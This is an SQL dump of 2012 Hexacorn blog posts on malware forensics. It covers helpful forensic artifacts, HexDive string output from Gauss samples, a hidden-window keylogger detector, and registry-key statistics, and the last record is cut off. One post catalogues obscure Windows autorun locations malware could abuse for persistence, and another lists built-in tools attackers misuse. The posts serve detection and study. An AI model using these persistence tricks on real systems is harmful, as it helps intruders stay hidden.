INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (347, 'Permanent Link to Finding Smoking Gun and going beyond that – Helpful Forensic Artifacts', 'Hexacorn', 'August 23, 2012 ', 'While I am quite critical about the idea of collecting IOCs (Indicator of Compromise) describing various malware, traces of hacking, etc in a form of hashes, even fuzzy hashes, file names, sizes, etc., etc.  I do believe that there is a certain number of IOCs (or as I call them: HFA –  Helpful Forensic Artifact – as they are not necessary relevant to compromise itself) that are universal and worth collecting. I am talking about artifacts that are common to malware functionality and offensive activities on the system in general as well as any other artifact that may help both attackers and… in investigation (thanks to ‘helpful’ users that leave unencrypted credentials in text files, watch movies on critical systems, etc.).\nIn this post, I will provide some practical examples of what I mean by that.\nBefore I kick it off, just a quick reminder – the reasons why I am critical about bloated IOC databases is that they have a very limited applicability in a general sense; and the limitations come as a result of various techniques used by malware authors, offensive teams, etc. including, but not limited to:\n\nmetamorphism\nrandomization\nencryption\ndata (e.g. strings) build on the fly (instead of hardcoding)\nshellcode-like payloads\nfast-flux\nP2P\ncovert channels\netc.\n\nNotably, antivirus detections of very advanced, metamorphic malware rely on state machines not strings and it’s naive to assume that collecting file names like sdra64.exe is going to save the day…\nAnyway…\nIf we talk about good, interesting HFAs I think of things that:\n\nare very often used in malware because of a simple fact they need to be there (dropping files, autostart, etc.)\ntraces of activities that must be carried on the compromised system (recon, downloading toolchests, etc.)\nalso (notably) traces of user activity that support attacker’s work (e.g. a file password.txt is not an IOC, but it’s HFA)\ntraces of system being affected in a negative way e.g. if system has been compromised previously by a generic malware, certain settings could have been changed (e.g. disabled tracing, blocked Task Manager, etc.); they are IOCs in a generic sense, but not really relevant to the actually investigated compromise; you can think of it of these aspects of system security that place the system on the opposite side to the properly secured and hardened box; it also included previously detected/removed malware – imho AV logs are not ‘clear’ IOCs as long as they relate to the event that is not related to investigated compromise\n\nIf we talk about a typical random malware, it’s usually stupidly written, using snippets copied&pasted from many sources on the internet. The authors are lazy and don’t even bother to encrypt strings, so detection is really easy. You can grep the file or a memory dump of a suspected process for typical autorun strings with strings, BinText, HexDive and most of the time you will find the smoking gun. If the attacker is advanced, all you will deal with is a blob of binary data that has no visible trace of being malicious unless disassembled – that is, a relocation independent, shellcode-like piece of mixed code/data in a metamorphic form that doesn’t require all the fuss of inline DLL/EXE loading, but it’s just a pure piece of code. It’s actually simple to write with a basic knowledge of assembly language and knowledge of OS internals. I honestly don’t know how to detect such malware in a generic way. I do believe that’s where the future of advanced malware is though (apart from going mobile). And I chuckle when I see malware that is 20MB in size (no matter how advanced the functionality).\nWhen we talk about IOC/HFAs and offensive security practices, it is worth mentioning that we need to follow the mind process of an attacker. Let me give you an example. Assuming that the attacker gets on the system. What things s/he can do? If the malware is already there, it’s easy as the functionality is out there and can be leveraged, malicious payload updated and attacker can do anything that the actual payload is programmed to do and within the boundaries of what environment where it runs permits. On the other hand, if it is an attack that comes through a typical hacking attempt, the situation is different. In fact, the attacker is very limited when it comes to available tools/functionality and often has to leverage existing OS tools. This means exactly what it says – attacker operates in a minimalistic environment and is going to use any possible tool available on OS to his/her benefit. If we talk about Windows system, it can be\n\nnet.exe (and also net1.exe)\ntelnet.exe\nftp.exe\n\nbut also\n\narp.exe\nat.exe\nattrib.exe\nbitsadmin.exe\ncacls.exe\ncertutil.exe\ncmd.exe\ncommand.com\ncompact.exe\ncscript.exe\ndebug.exe\ndiantz.exe\nfindstr.exe\nhostname.exe\nicacls.exe\niexpress.exe\nipconfig.exe\nmakecab.exe\nmofcomp.exe\nmore.com\nmsiexec.exe\nmstsc.exe\nnet1.exe\nnetsh.exe\nnetstat.exe\nping.exe\npowershell.exe\nreg.exe\nregedit.exe\nregedt32.exe\nregini.exe\nregsvr32.exe\nrobocopy.exe\nroute.exe\nrunas.exe\nrundll32.exe\nsc.exe\nschtasks.exe\nscrcons.exe\nshutdown.exe\ntakeown.exe\ntaskkill.exe\ntasklist.exe\ntracert.exe\nvssadmin.exe\nwhoami.exe\nwscript.exe\nxcacls.exe\nxcopy.exe\n\nand OS commands\n\necho\ntype\ndir\nmd/mkdir\nsysteminfo\n\nand many other command line tools and commands.\nSo, if you analyze memory dump from a Windows system, it’s good to search for presence of a file name associated with built-in windows utilities and look at the context i.e. surrounding memory region to see what can be possibly the reason of it being there (cmd.exe /c being the most common I guess).\nBack to the original reason of this post – since I wanted to provide some real/practical examples of HFAs that one can utilize to analyze hosts, let me start with a simple classification by functionality/purpose:\n\ninformation gathering\n\nnet.exe\nnet1.exe\npsexec.exe/psexesvc.exe\ndsquery.exe\narp.exe\ntraces of shell being used (cmd.exe /c)\npasswords.txt, password.txt, pass.txt, etc.\n\n\ndata collection\n\ntype of files storing collected data\n\npossibly password protected archives\nencrypted data (e..g credit cards/track data)\n\n\nvarious 3rd party tools to archive data:\n\nrar, 7z, pkzip, tar, arj, lha, kgb, xz, etc.\n\n\nOS-based tools\n\ncompress.exe\nmakecab.exe\niexpress.exe\ndiantz.exe\n\n\ntype of collected data\n\nscreen captures often saved as .jpg (small size)\nscreen captures file names often include date\nkeystroke names and their variants\n\nPgDn, [PgDn],{PgDn}\nVK_NEXT\nPageDown, [PageDown] {PageDown}\n\n\ntimestamps (note that there are regional settings)\npredictable Windows titles\n\n[ C:\\WINDOWS\\system32\\notepad.exe ]\n[ C:\\WINDOWS\\system32\\calc.exe ]\n[http://google.com/ – Windows Internet Explorer]\n[Google – Windows Internet Explorer]\n[InPrivate – Windows Internet Explorer – [InPrivate]]\n\n\npossible excluded window class names\n\nmsctls_progress32\nSysTabControl32\nSysTreeView32\n\n\ncontent of the address bar\nattractive data for attackers\n\nregexes for PII (searching for names/dictionary/, states, countries, phone numbers, etc. may help)\nanything that matches Luhn algorithm (credit cards)\n\n\ninput field names from web pages and related to intercepted/recognized credentials\n\nuser\nusername\npassword\npin\n\n\npredictable user-generated content\n\ninternet searches\nchats (acronymes, swearwords, smileys, etc.)\n\n\n\n\n\n\n\n\ndata exfiltration\n\nwho\n\nusername/passwords\n\n\nhow\n\nftp client (ftp.exe, far.exe, etc.)\nbrowser (POSTs, more advanced: GETs)\nDNS requests\nUSB stick\nburnt CD\nprinter\n\n\nhow\n\njust in time (frequent network connection)\n‘coming back’ to the system\n\n\nconfiguration\n\nfile\nregistry\nuses GUI (lots of good keywords!)\n\n\nwhere to:\n\nURLs\nFTP server names\nSMTP servers\nmapped drives (\\\\foo\\c$)\nmapped remote paths (e.g. \\\\tsclient)\n\n\n\n\n\n\nmalicious code\n\nany .exe/.zip in TEMP/APPLICATION DATA subfolders\nprocesses that have a low editing distance between their names and known system processes (e.g. lsass.exe vs. lsas.exe)\nprocesses that use known system processes but start from a different path\nareas of memory containing “islands” with raw addresses of APIs typically used by malware e.g. CreateRemoteThread, WriteProcessMemory, wininet functions\n\n\nmistakes\n\nEvent logs\nAV logs/quarantine files\nleftovers (files, etc.)\n\n\n\nMany of these HFAs form a very managable set that when put together can be applied to different data sets (file names, file paths, file content, registry settings, memory content, process dumps, etc.).\nIn other words – instead of chasing after a sample/family/hacking group-specific stuff, we look for traces of all these things that make a malware – malware, a weak system – weak, a hack – hack and attack-supporting user – victim.\nShare this :)', 'Compromise Detection, Forensic Analysis, Malware Analysis, Preaching, Tips & Tricks', 'http://www.hexacorn.com/blog/2012/08/23/finding-smoking-gun-and-going-beyond-that-helpful-forensic-artifacts/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (348, 'Permanent Link to HexDive 0.4', 'Hexacorn', 'August 19, 2012 ', 'It’s been a while since I updated HexDive, so I took some time today to fix a few things + add new keywords.\nSo, what’s new?\nMainly lots of new keyword sets. Some are just a tip of an iceberg and I will be extending these as I go through a malware collection in the future, but even at this stage these should certainly help in picking up some new interesting stuff, including but not limited to:\n\nnew banking-related strings\nmore information stealing strings (PStore, Firefox, FTP programs, Certificates, etc.)\nkeystrokes (thx Corey)\nanti-sandbox tricks (partially based on an excellent summary post from Joe Security LLC and interesting new technique described by F-Secure)\nswearwords\nlots of new registry keys related to settings, games, P2P, and lots of other applications\nsome default passwords occasionally used by worms\ngeneric malware strings (lots of them, I still need to classify them, but at least they are already in the set)\n\nYou can download current version of HexDive here. If your .exe download is blocked, you can try a zip file.\np.s.\nI still don’t pay too much attention to a Linux version – this is lower priority than a different feature I am currently working on (stay tuned).\n \nBonus update:\nhdive ran over two gauss samples\n\n08D7DDB11E16B86544E0C3E677A60E10_100-dskapi.ocx\n5604A86CE596A239DD5B232AE32E02C6_smdk.ocx\n\nVarious classes of interesting strings are highlighted:\n08D7DDB11E16B86544E0C3E677A60E10_100-dskapi.ocx\nCorExitProcess\nmscoree.dll\nnull\nnull\nsupport\nopen\nsupport\nsupport\nkernel32.dll\nlocal\nlocal\nlocal\ndefault\nlocal\ndddd, MMMM dd, yyyy\nGetLastActivePopup\nGetActiveWindow\nMessageBoxA\nUSER32.DLL\nSunMonTueWedThuFriSat\nurlmon.dll\nSeTakeOwnershipPrivilege\ninflate\n deflate\nabcd\nABCD\nabcd\nSeRestorePrivilege\n SeTakeOwnershipPrivilege\n SeRestorePrivilege\nLoadLibraryW\nkernel32.dll\nGetCommandLineW\nSleep\nkernel32.dll\nFreeLibrary\nkernel32.dll\nVirtualFree\nkernel32.dll\nExitThread\nkernel32.dll\nDeleteFileA\nkernel32.dll\nMoveFileExA\nkernel32.dll\nntdll.dll\nSeRestorePrivilege\n SeBackupPrivilege\nRegCreateKeyExW\n RegSaveKeyW\n RegRestoreKeyW\n RegOpenKeyExW\n RegFlushKey\n RegCloseKey\n RegSetValueExW\n RegDeleteValueW\n RegQueryValueExW\nObtainUserAgentString\n HttpSendRequestW\n InternetQueryOptionW\n InternetSetOptionW\n InternetCloseHandle\n InternetQueryDataAvailable\n HttpAddRequestHeadersW\n InternetReadFile\n HttpQueryInfoW\n InternetOpenW\n InternetConnectW\n HttpOpenRequestW\n OpenProcessToken\n ImpersonateLoggedOnUser\nAdjustTokenPrivileges\nLookupPrivilegeValueW\nRegDeleteKeyW\nSetEntriesInAclW\nFreeSid\nMoveFileExW\nCloseHandle\nDeleteFileW\nCreateMutexW\nSleep\nGetCurrentProcessId\nVirtualAlloc\nLoadLibraryW\nCreateThread\nGetModuleFileNameW\nVirtualFree\nGetCurrentProcess\nGetModuleHandleA\nOpenProcess\nGetLastError\nGetFileSize\nReadFile\nCreateFileW\nGetPrivateProfileStringW\nFreeLibrary\nGetProcAddress\nGetSystemTime\nDuplicateHandle\nMultiByteToWideChar\nLoadResource\nSizeofResource\nLockResource\nGetVersionExW\nCreateToolhelp32Snapshot\nGetFileAttributesW\nGetModuleHandleW\nSetFileTime\nWriteFile\nProcess32FirstW\n ReadProcessMemory\n Process32NextW\n WriteProcessMemory\n VirtualAllocEx\n CreateRemoteThread\nVirtualFreeEx\nLocalFree\nLocalAlloc\nLoadLibraryA\nTerminateProcess\nSetUnhandledExceptionFilter\nIsDebuggerPresent\nGetCurrentThreadId\nGetCommandLineA\nHeapFree\nGetVersionExA\nHeapAlloc\nExitProcess\nGetFileType\nGetStartupInfoA\nDeleteCriticalSection\nGetModuleFileNameA\nFreeEnvironmentStringsA\nGetEnvironmentStrings\nFreeEnvironmentStringsW\nWideCharToMultiByte\nGetEnvironmentStringsW\nHeapDestroy\nHeapCreate\nQueryPerformanceCounter\nGetTickCount\nGetSystemTimeAsFileTime\nGetCPInfo\nGetACP\nLeaveCriticalSection\nEnterCriticalSection\nInitializeCriticalSection\nSetFilePointer\nGetStringTypeA\nGetStringTypeW\nGetLocaleInfoA\nWriteConsoleA\nWriteConsoleW\nCreateFileA\nFlushFileBuffers\nGetSystemMetrics\n5604A86CE596A239DD5B232AE32E02C6_smdk.ocx\nCorExitProcess\nmscoree.dll\nnull\nnull\nsupport\nopen\nsupport\nsupport\nlocal\nlocal\nlocal\ndefault\nlocal\nkernel32.dll\ndddd, MMMM dd, yyyy\nengland\nchinese\nchinese\nchinese\nchinese\nGetProcessWindowStation\nGetLastActivePopup\nGetActiveWindow\nMessageBoxA\nUSER32.DLL\nSunMonTueWedThuFriSat\ndeflate\nJean-loup Gailly\n Mark Adler\ntrue\nRegOpenKeyW\nRegCloseKey\nRegQueryValueExW\nRegOpenKeyExW\nTerminateThread\nCreateThread\nProcess32NextW\nCreateToolhelp32Snapshot\nGetLastError\nProcess32FirstW\nDuplicateHandle\nGetCurrentProcess\nSetEvent\nGetLogicalDriveStringsW\nGetSystemTime\nDeviceIoControl\nCreateFileW\nGetDriveTypeW\nFindClose\nFindFirstFileW\nFindNextFileW\nLocalAlloc\nGetProcAddress\nFreeLibrary\nLoadLibraryA\nTerminateProcess\nSetUnhandledExceptionFilter\nIsDebuggerPresent\nGetCurrentThreadId\nGetCommandLineA\nHeapFree\nGetVersionExA\nHeapAlloc\nGetModuleHandleA\nSleep\nExitProcess\nGetFileType\nGetStartupInfoA\nDeleteCriticalSection\nGetModuleFileNameA\nFreeEnvironmentStringsA\nGetEnvironmentStrings\nFreeEnvironmentStringsW\nWideCharToMultiByte\nGetEnvironmentStringsW\nHeapDestroy\nHeapCreate\nVirtualFree\nQueryPerformanceCounter\nGetTickCount\nGetCurrentProcessId\nGetSystemTimeAsFileTime\nGetCPInfo\nGetACP\nLeaveCriticalSection\nEnterCriticalSection\nVirtualAlloc\nWriteFile\nInitializeCriticalSection\nMultiByteToWideChar\nGetStringTypeA\nGetStringTypeW\nGetLocaleInfoA\nSetFilePointer\nWriteConsoleA\nWriteConsoleW\nCreateFileA\nFlushFileBuffers\nGetFileSize\nGetFileAttributesW\nShare this :)', 'HexDive, Malware Analysis, Software Releases', 'http://www.hexacorn.com/blog/2012/08/19/hexdive-0-4/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (349, 'Permanent Link to Windows Disco', 'Hexacorn', 'August 7, 2012 ', 'Detecting malware on a live system is often very difficult and requires special tools and lots of experience.There are situations though when some simple techniques can be used as well. This post introduces one such technique and provides a simple demo tool (toy really) you can use to play around.\nThe technique itself relies on a simple fact that many keylogging malware apps utilize a hidden ‘worker’ window and often offer extensive GUI that is not typically visible, but can be accessed by a malicious user after pressing a combination of keys. Worker window receives all intercepted keystrokes that are being sent by a hook procedure and GUI is used to set up keylogger parameters/view logs, etc. So, since such ‘working’/hidden GUI windows are not visible to the user, but they are still windows one can still enumerate them and present them to the user (even if windows are invisible).\nThis is exactly what Windows Disco does. It walks through all processes and their windows and takes a screenshot of each window, then saves it to a temporary PNG file in a current subfolder (named disco); you may review all these files either in an application itself, or in an Explorer, IrfanView or other image viewer.\n\nFor naysayers: yes, of course this can be so easily bypassed and is of course not foolproof – everything can be hooked and both enumeration and screenshot-taking prevented as well as keylogging can be implemented in a different way, but this is a demo of a trivial technique, not a ‘solve it all’ software  who knows… with more and more malware moving back from kernel to userland such simple techniques may turn to be actually useful.\nAnother similar technique that might be potentially useful is hotkey enumeration – provided that keylogger registers a hotkey in a documented way one could use a hotkey enumeration tool to find suspicious associations (again I know this is far fetched, many keyloggers use state machine to trigger their hidden GUI, but always… ). The tool + src to enumerate hotkeys and article in Russian can be found here and  here.\nAs usual, testing on VM first is advised. Occasionally the GUI may be less responsive, pls be patient and kill it if necessary.\nThe whole procedure ends when MessageBox pops up showing how many windows have been enumerated.\n \n\nThe following screenshots have been taken from various keylogging applications; as you can see some are more ‘ostentatious’, some less.\n\n\n\nAs mentioned earlier, all files are saved in a ‘disco’ directory and can be reviewed using various browsers:\n\nYou can download HWD here.\nShare this :)', 'Compromise Detection, HWD, Malware Analysis, Software Releases', 'http://www.hexacorn.com/blog/2012/08/07/windows-disco/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (350, 'Permanent Link to Beyond good ol’ Run key', 'Hexacorn', 'July 23, 2012 ', 'I recently kept posting quite a lot about random stats from 300k/1M samples. Today something different for a change: non-obvious or less-known autorun entries.\nThe ‘obvious’ introduction\nAs we know, malware needs to work. To do so, it needs to ensure it runs when the system starts. Well, not really. In fact, it just needs to ensure it runs in general and can start at any time as long as it is at a right moment to activate its payload (e.g. keylogger doesn’t need to autostart with the system; it can activate when the user opens a browser or mail client).\nMalware authors are really lucky.  There are so many autorun possibilities in Windows that it is really hard to count. One of the best known tools that try to enumerate most of the entries are Start Runners and Sysinternals’ autoruns. They both do a a great job by highlighting many of the suspicious files, but… deep inside the registry and file system exist a HUGE number of completely new, unexplored (or possibly less or under- explored) paths that can be (maybe already are)  misused.\nObviously, run-at-system start, run-at-logon are commonly used out of convenience, yet all file/registry locations supporting this persistence mechanism are already very well known and pretty much every single AV is always scanning these locations first (not to mention forensic investigators poking around on the analyzed system :)). There are of course many examples of other autostart locations that are not system/logon related and these include Browser Helper Objects, Layered Service Provider DLLs, codecs, protocols handlers, shell extensions, toolbars, deskbars, etc. etc. These are not all though and there is a lot of possibilities out there.  In this post I provide a quick brain dump of various ideas related to this subject – some may be considered silly, or not worth attention, but… oh well, it’s just a post about possibilities  Better evil known that unknown.\nThe autoruns hidden inside other applications\nOne of the non-standard autorun entries that is probably the most known and documented is the ICQ entry stored under:\n\n\nHKEY_CURRENT_USER\\Software\\Mirabilis\\ICQ\\Agent\\Apps\n\n\nThe old version of ICQ allowed to add a list of applications that it would launch when it connected to network – the following screenshots are taken from old versions of this great software (imho it used to be a real killer app!).\n\nAdding calculator to be run by ICQ was relatively easy:\n\nAnd it would then appear on the list:\n\nLooking at the registry under\n\n\nHKEY_CURRENT_USER\\Software\\Mirabilis\\ICQ\\Agent\\Apps\n\n\nwould show us the actual entry:\nI have a vague memory of successfully testing it ages ago, but since the old version no longer works and I was unable to confirm it for this blog post let’s just trust the evidence that can be found online: Googling for this key brings up quite a few hits that show evidence of it being actively used by malware.\nAs far as I know new versions of ICQ do not support it anymore.\nThis, obviously is not the only app ever developed that ‘by design’ helps in launching application when some task/event is completed.\nFor example, similar functionality can be found in many torrent applications e.g. utorrent:\nAdding the entry as shown on the screenshot would make utorrent launch calculator every time it finishes downloading the torrent (the actual data for utorrent autorun is stored inside its configuration file settings.dat).\n\nSame goes for bittorrent client (not a surprise the code of the clients being shared)\n\nAgain, the settings.dat holds the ‘autorun’ data:\nThere may be other applications like this.\nThe even more hidden autoruns hidden inside applications\nPretty much every single downloader, torrent client, media grabber, etc. contains an option to preview files a.k.a. media player.\nThis is certainly a possible malware’s autorun as it will be executed anytime someone tries to preview/prelisten the video/music downloaded from P2p client or grabbed from a media grabber; again in a case of e.g. for utorrent:\n\nand emule:\nThere are certainly lots of applications like this.\n‘Scanning’ files with AV when downloaded\nAnother option to place a malicious file resides in many applications e.g. browsers, mail clients. They allow to scan every single  file that has been downloaded from the internet, attached to email or received via Instant Messenger with an extremal application.\nSuch feature is available e.g. in Firefox with a Download Status Bar installed.\n\nThe about:config page shows the following options (false assigned to ‘downbar.function.virusScan’ property indicates the scan is being disabled)”\n\nthe default application selected is ‘C:/Program Files/myAnti-VirusProgram.exe’, but of course malware could easily replace it:  \nand modify the ‘downbar.function.virusScan’ property to true.\nNotably, placing malware as ‘c:\\Program Files\\myAnti-VirusProgram.exe’ doesn’t seem to work due to slash/backslash war (this could be a neat trick if it worked).\nWindows Shell alternatives\n\nWindows Explorer is not the only Windows Shell available. In fact there are lots of alternatives and each of them brings lots of new options to the table. Looking at programs used by hundreds of thousands (if not millions) of users and including Total Commander, FAR, and many others can cause a real headache. From an offensive perspective there are really a lot of opportunities: from plugins and extensions, to completely new (lame, but certainly workable) ‘rootkitish’ methods for hiding under (sic!) the shell (e.g. custom views, or even simple GUI attacks).\nThe less obvious places for malware autorun\nMost of producers of scanners/printers/combos offer  ‘associated software’ that will be taking control of many aspects of the dialog between the user, device and computer.\nOne of the tasks handled by the software is  ‘Start this program’ function which is an application that runs when certain events happen e.g. you press a specific button on the scanner/printer. The following screenshot is taken on a system with a CanoScan 4400F scanner attached to it, but with no software installed. The ‘Start this program’ option is grayed out.\n\nInstalling a Canon Toolbox gives assigns this program to an event associated with various user activities e.g. pressing COPY button on the scanner.\n\nClicking the ComboBox reveals more events – all of them are associated with the specific application:\n\nYou are probably wondering now where the information about this is stored in the registry/on the file system.\nThe program responding to device events itself is an example of Push-Model Aware Applications added to the system via Windows Image Acquisition (WIA) / Still Image  interface (STI).\nThe location in the registry where the Push-Model Aware Applications installed on the system are actually listed are described in the article that I just linked to:\n\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\StillImage\\Registered Applications\n\n\nThe programs registered this way can respond to STI events. Of course, malware could overwrite/manipulate the entry and act as a man in the middle between the devioe and the actual software configured to respond to the event. It could also be added to respond to certain events – the actual registry entries that need to be added are described here (I have not tested it though): and include:\n\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\explorer\\AutoplayHandlers\\Handlers\n\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\StillImage\\Registered Applications\n\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\StillImage\\Events\\STIProxyEvent\n\n\nAutostart by re-using existing entries\n\nInstead of adding new entries to Run/Startup folder, etc. malware can leverage existing registry entries. In many cases, swapping VERY common entries e.g. for jusched.exe from Java updater, or ctfmon.exe could do the trick. Another option is companion infection for active processes on the system – especially interesting for applications in a Portable format as they are used more and more often and not too many people actually inspect their content. They can also easily be hidden on an inspected system and escape routine analysis of Program Files directory.\nPlugins,  Plugins,  Plugins\nI mentioned plugins in a context of Windows Explorer alternatives, the same goes for various office suites, Drawing/design applications, gfx viewers (note e.g. Irfanview has a subfolder storing all the plugins – DLL files) and so on and so forth. This is a tip of an iceberg.\nFile System infection\nOne of the most interesting pieces of malware back in DOS era was DIR-II. It had a unique way of infecting executable files by modifying their cluster map in the FAT itself. Each .exe would point to a cluster containing the malicious code (always the same cluster) so with a malware NOT active in memory, the file system would appear to be corrupted (because of multiple entries pointing to the same cluster – a problem known as cross-linking). With malware active in memory it would ‘fix’ cross-linking on the fly and execute files properly.\nThe very same technique could be potentially implemented for NTFS – this would require placing a small .exe on a system then changing the cluster sequence within FILE Record to always point to a cluster occupied by .exe. Other alternative (especially for the one formatted with a FILE record larger than 1024 bytes) would require a tiny .exe that could be stored within the $MFT file record itself (replacing non-resident attribute with a resident attribute) while the actual clusters used by a host file could be stored either in a different part of the file record or within the malicious code itself. In both cases, small .exe would read original clusters and transfer control to the host. Very very non-trivial task. Luckily.\n \nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2012/07/23/beyond-good-ol-run-key/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (351, 'Permanent Link to Random Stats from 1M samples – RegKeys', 'Hexacorn', 'July 20, 2012 ', 'Update\nHarlan proposed to search for ‘system\\’. I did and added stats below.\nOld post\nCorey asked on Twitter about stats for registry keys so I grepped the strings extracted from samples for traces of related artifacts. Since it’s a non-trivial task (at least dynamic analysis are needed to confirm which reg keys are really used during run-time and even more work is needed to confirm which keys are actually malware-related) I only searched for the ‘Software\\’  string assuming that is is a decent keyword to start with. If you have better ideas, please let me know.\nThese are above 1000 occurrences for ‘SOFTWARE\\’:\n 112294 SOFTWARE\\Borland\\Delphi\\RTL\r\n  89263 Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n  81916 Software\\Borland\\Delphi\\Locales\r\n  80672 Software\\Borland\\Locales\r\n  53495 Software\\Microsoft\\Windows\\CurrentVersion\r\n  48312 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\r\n  45933 Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\r\n  31554 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects\r\n  21968 Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\n  21788 Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\r\n  21420 Software\\Microsoft\\Internet Explorer\\Main\r\n  20350 SOFTWARE\\\r\n  18188 Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\r\n  17461 Software\\\r\n  16913 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\r\n  16271 SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\r\n  11711 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL\r\n  10785 SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\r\n  10471 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Setup\r\n  10305 Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\r\n   9981 Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\User Agent\\Post Platform\r\n   9894 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\SuperHidden\r\n   9443 SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\r\n   9285 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\HideFileExt\r\n   8805 Software\\%s\r\n   8371 Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\n   8215 SOFTWARE\\Microsoft\\Internet Explorer\\Main\r\n   8206 Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Network\r\n   7826 Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\n   7614 Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Comdlg32\r\n   7465 Software\\Microsoft\\Internet Explorer\r\n   7252 SoftWare\\Microsoft\\Windows\\CurrentVersion\\Run\r\n   7183 SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\FontSubstitutes\r\n   6988 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\r\n   6918 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN\r\n   6187 Software\\WinLicense\r\n   5573 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellExecuteHooks\r\n   5510 Software\\Microsoft\\Active Setup\\Installed Components\\\r\n   5209 HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\r\n   5184 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\n   4925 Software\\Microsoft\\Internet Explorer\\PageSetup\r\n   4886 Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\r\n   4739 Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\WinOldApp\r\n   4625 Software\\Microsoft\\OLE\r\n   4568 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\\r\n   4396 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\r\n   4348 Software\\Microsoft\\Windows\\CurrentVersion\\explorer\\Browser Helper Objects\\\r\n   4182 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\explorer\\run\r\n   3994 Software\\Classes\\\r\n   3933 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\r\n   3739 Software\\Microsoft\\Windows\\CurrentVersion\\run\r\n   3704 Software\\Fenomen Games\\Game Downloader\\1.1\\List\r\n   3533 SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\r\n   3532 SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\r\n   3506 Software\\WinRAR SFX\r\n   3498 SOFTWARE\\SweetIM\\Messenger\r\n   3492 SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v1.1.4322\r\n   3420 Software\\MediaGet\r\n   3420 SOFTWARE\\MediaGet\r\n   3408 Software\\Mediaget\r\n   3408 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{70B96CD0-FDF2-489E-8FA0-0F92ED599368}\r\n   3407 Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\MediaGet\r\n   3316 SOFTWARE\\BabylonToolbar\\BabylonToolbar\\Instl\r\n   3302 Software\\BioWare\\NWN\\Neverwinter\r\n   3291 SOFTWARE\\Microsoft\\Security Center\r\n   3281 SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\r\n   3268 Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\r\n   3238 Software\\Microsoft\\Windows\\CurrentVersion\\explorer\\ShellExecuteHooks\r\n   3207 Software\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\r\n   3149 Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\r\n   2978 Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\run\r\n   2899 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\r\n   2764 Software\\Microsoft\\Windows NT\\CurrentVersion\r\n   2763 Software\\Microsoft\\Internet Account Manager\\Accounts\r\n   2749 Software\\Microsoft\\Internet Explorer\\TypedURLs\r\n   2746 SOFTWARE\\Microsoft\\Internet Explorer\r\n   2686 Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\r\n   2643 Software\\Microsoft\\Windows\\CurrentVersion\\policies\\explorer\\run\r\n   2619 Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\r\n   2527 Software\\Microsoft\\Windows\\CurrentVersion\\WinTrust\\Trust Providers\\Software Publishing\\Trust Database\\0\r\n   2513 Software\\Microsoft\\Windows\\ShellNoRoam\\MUICache\r\n   2478 Software\\Wine\r\n   2402 Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\User 